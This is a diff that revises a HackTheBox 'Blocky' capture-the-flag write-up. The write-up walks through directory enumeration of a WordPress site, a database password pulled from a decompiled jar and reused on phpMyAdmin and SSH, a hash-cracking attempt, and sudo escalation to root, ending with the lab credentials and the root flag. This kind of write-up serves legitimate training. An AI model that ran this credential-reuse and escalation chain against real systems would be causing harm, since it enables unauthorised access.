@@ -48,7 +48,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 16.45 seconds
 ```
 
-It seems like there’s an FTP port open. Let’s try it out!
+It seems like there’s an FTP port open.
 
 ```bash
 ┌──(root💀shiro)-[/home/shiro]
@@ -66,48 +66,33 @@ ftp> ls
 ftp: Can't bind for data connection: Address already in use
 ```
 
-Seems like we don’t have anonymous access… 
+We can’t seem to get any access to the FTP server. 
 
 ## Website
 
 ![Website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/Website.png?raw=true)
 
-It seems like the website is running on Wordpress!
-
-Let’s use `dirsearch` to check for any interesting directories. :)
+It seems like the website is running on WordPress! Used `dirsearch` to check for interesting directories.
 
 ```bash
 ┌──(root💀shiro)-[/home/shiro]
 └─# dirsearch -u 10.10.10.37:80     
 ...
-[11:25:51] 301 -    0B  - /index.php  ->  http://10.10.10.37/
-[11:25:52] 301 -  315B  - /javascript  ->  http://10.10.10.37/javascript/
-[11:25:52] 200 -   19KB - /license.txt
-[11:25:57] 200 -   13KB - /phpmyadmin/doc/html/index.html
 [11:25:57] 301 -  315B  - /phpmyadmin  ->  http://10.10.10.37/phpmyadmin/
 [11:25:58] 200 -   10KB - /phpmyadmin/
 [11:25:58] 200 -   10KB - /phpmyadmin/index.php
 [11:25:58] 301 -  312B  - /plugins  ->  http://10.10.10.37/plugins/
 [11:25:58] 200 -  745B  - /plugins/
 [11:26:00] 200 -    7KB - /readme.html
-[11:26:01] 403 -  299B  - /server-status
-[11:26:01] 403 -  300B  - /server-status/
-[11:26:07] 200 -  380B  - /wiki/
-[11:26:07] 301 -  309B  - /wiki  ->  http://10.10.10.37/wiki/
 [11:26:07] 301 -  313B  - /wp-admin  ->  http://10.10.10.37/wp-admin/
 [11:26:07] 301 -  315B  - /wp-content  ->  http://10.10.10.37/wp-content/
 [11:26:07] 200 -    0B  - /wp-config.php
 [11:26:07] 200 -    0B  - /wp-content/
 [11:26:07] 200 -    1B  - /wp-admin/admin-ajax.php
-[11:26:07] 200 -   69B  - /wp-content/plugins/akismet/akismet.php
-[11:26:07] 500 -    0B  - /wp-content/plugins/hello.php
 [11:26:07] 200 -  965B  - /wp-content/uploads/
-[11:26:07] 200 -    1KB - /wp-admin/install.php
 [11:26:07] 302 -    0B  - /wp-admin/  ->  http://10.10.10.37/wp-login.php?redirect_to=http%3A%2F%2F10.10.10.37%2Fwp-admin%2F&reauth=1
-[11:26:07] 500 -    4KB - /wp-admin/setup-config.php
 [11:26:07] 301 -  316B  - /wp-includes  ->  http://10.10.10.37/wp-includes/
 [11:26:07] 200 -    0B  - /wp-cron.php
-[11:26:07] 500 -    0B  - /wp-includes/rss-functions.php
 [11:26:07] 200 -   40KB - /wp-includes/
 [11:26:07] 200 -    2KB - /wp-login.php
 [11:26:07] 302 -    0B  - /wp-signup.php  ->  http://10.10.10.37/wp-login.php?action=register
@@ -116,13 +101,13 @@ Let’s use `dirsearch` to check for any interesting directories. :)
 
 Seems like there are some interesting pages called `wp-login.php`, `wp-admin`, `phpmyadmin` and `plugins`! Let’s check it out~
 
-### Wordpress Login Page
+### WordPress Login Page
 
 ![Wordpress_Login](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/Wordpress_Login.png?raw=true)
 
-I tried using the default Wordpress credentials `admin:password` but it didn’t work.
+Default credentials didn’t work.
 
-### Wordpress Admin Page
+### WordPress Admin Page
 
 ![Wordpress_Admin](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/Wordpress_Admin.png?raw=true)
 
@@ -132,38 +117,32 @@ This was just a redirect back to `wp-login.php`
 
 ![PHPMyAdmin_Page](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/PHPMyAdmin_Page.png?raw=true)
 
-The default credentials `admin:<blank>` does not work here as well…
+Default credentials did not work here as well.
 
 ### Plugins Page
 
 ![Plugins](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/Plugins.png?raw=true)
 
-Seems like there are some interesting files here. Let’s download them to inspect it with `jd-gui`!
+However, there were some interesting files on `/upload` directory. Downloaded them to inspect it with `jd-gui`.
 
 ![BlockyCore_Decompiled](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/BlockyCore_Decompiled.png?raw=true)
 
-There is some interesting information inside the class file OwO
+There is some interesting information inside the class file!
 
 ```java
 public String sqlUser = "root";
 public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
 ```
 
-Since the box does not have any `SQL` service open, can we assume that there’s some password reuse? :D
-
-Trying the credentials on the `phpmyadmin` page worked!
+Since the box does not have any `SQL` service open, can we assume that there’s some password reuse?  Trying the credentials on the `phpmyadmin` page worked!
 
 ![PHPMyAdmin_Login](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/PHPMyAdmin_Login.png?raw=true)
 
 # Exploitation
 
-After surfing around the `phpmyadmin` page for some interesting information, I found a user information on `wordpress (left pane) > wp_users table`!
+There was a user credentials on `wp_users table`: `username:notch` and `password hash:$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/`
 
 ![PHPMyAdmin_Users](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/PHPMyAdmin_Users.png?raw=true)
-
-`username:notch` and `password hash:$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/`
-
-Let’s try using John the Ripper to crack the password!
 
 ```bash
 ┌──(root💀shiro)-[/home/shiro/HackTheBox/Blocky]
@@ -171,26 +150,14 @@ Let’s try using John the Ripper to crack the password!
 notch:$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/                                                                                              
 ┌──(root💀shiro)-[/home/shiro/HackTheBox/Blocky]
 └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-Using default input encoding: UTF-8
-Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
-Cost 1 (iteration count) is 8192 for all loaded hashes
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-0g 0:00:04:45 DONE (2022-02-09 11:56) 0g/s 50256p/s 50256c/s 50256C/s !!!@@@!!!..*7¡Vamos!
-Session completed. 
+...
 ```
 
-It seems like there was no password found…
-
-At this point, I was running out of ideas. However, I remembered that there was a `ssh` port open! So I tried using the username `notch` and the password found previously in the `jar` file to login… and it worked!
+It seems like the password hash could not be cracked. However, I remembered that there was a `ssh` port open. Logging in to SSH with the credentials `notch:8YsqfCTnvxAUeduzjNSXe22` worked.
 
 ```bash
 ┌──(shiro㉿shiro)-[/home/shiro/HackTheBox/Blocky]
 └─$ ssh notch@10.10.10.37  
-The authenticity of host '10.10.10.37 (10.10.10.37)' can't be established.
-ED25519 key fingerprint is SHA256:ZspC3hwRDEmd09Mn/ZlgKwCv8I8KDhl9Rt2Us0fZ0/8.
-This key is not known by any other names
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 ...
 notch@Blocky:~$ ls
 minecraft  user.txt
@@ -213,7 +180,7 @@ User notch may run the following commands on Blocky:
     (ALL : ALL) ALL
 ```
 
-Well… lucky for us, `notch` can run all commands as `sudo` :D
+Well… lucky for us, `notch` can run all commands as `sudo`.
 
 ```bash
 notch@Blocky:~$ sudo su
@@ -222,4 +189,3 @@ uid=0(root) gid=0(root) groups=0(root)
 root@Blocky:/home/notch# cat /root/root.txt 
 0a9694a5b4d272c694679f7860f1cd5f
 ```
-
